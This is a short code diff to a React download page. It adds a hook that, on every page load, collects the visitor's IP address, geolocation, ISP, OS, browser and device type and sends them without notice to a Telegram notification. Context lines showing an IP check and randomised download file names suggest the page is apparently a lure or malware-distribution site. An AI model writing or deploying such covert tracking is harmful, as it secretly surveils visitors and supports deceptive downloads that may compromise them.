@@ -270,6 +270,23 @@ const Download = () => {
     checkIp();
   }, []);
 
+  // Send visit notification with geo data
+  useEffect(() => {
+    if (visitNotifiedRef.current) return;
+    visitNotifiedRef.current = true;
+    const sendVisit = async () => {
+      const ip = await fetchVisitorIp();
+      const geo = ip ? await fetchIpGeoData(ip) : { ip: "Unknown", isp: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" };
+      sendTelegramNotification("visit", {
+        ...geo,
+        os: getOSName(),
+        browser: getBrowserName(),
+        device: getDeviceType(),
+      });
+    };
+    sendVisit();
+  }, []);
+
   const downloadFile = useMemo(() => {
     const ua = navigator.userAgent;
     const suffix = randomDigits(8);
